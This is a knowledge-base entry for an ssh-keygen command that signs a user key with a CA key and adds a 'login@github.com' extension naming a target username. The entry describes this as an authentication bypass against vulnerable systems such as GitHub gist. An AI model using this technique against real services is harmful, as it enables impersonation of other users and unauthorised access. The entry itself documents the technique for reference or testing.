---
data: >-
  ssh-keygen -s ca_key -I cert_id -n principals -O
  extension:login@github.com=targetusername user_key.pub
tags:
  - ssh
  - certificate
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 51ccd50a-ebed-4d31-ae05-e64fb8b7d553
created_at: '2025-12-11T03:47:39.337Z'
updated_at: '2025-12-11T03:47:39.337Z'
verified: false
validated: true
submitted: true
---
# ssh-keygen-generate-certificate

## Command

```bash
ssh-keygen -s ca_key -I cert_id -n principals -O extension:login@github.com=targetusername user_key.pub
```

## Description

This command uses ssh-keygen to sign a user public key with a CA key, adding a custom extension to specify an arbitrary username for authentication bypass in vulnerable systems like GitHub gist.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s ca_key` | Path to the CA private key | Yes |
| `-I cert_id` | Certificate identity | Yes |
| `-n principals` | Principals (usernames) for the certificate | Yes |
| `-O extension:login@github.com=targetusername` | Custom extension for username | Yes |
| `user_key.pub` | User public key to sign | Yes |

## Examples

### Basic Usage

```bash
ssh-keygen -s ca_key -I cert_id -n user -O extension:login@github.com=target user_key.pub
```

### Advanced Usage

```bash
ssh-keygen -s ca_key -I cert_id -n user -V +52w -O extension:login@github.com=target -O no-agent-forwarding user_key.pub
```

## Expected Output

A signed certificate file (user_key-cert.pub) is created, and ssh-keygen outputs 'Signed user key user_key-cert.pub: id "cert_id" serial 0 valid forever' if successful.

## Related

- [[procedures/Generate-SSH-Certificate-with-Arbitrary-Username-Extension]]
- #ssh-keygen
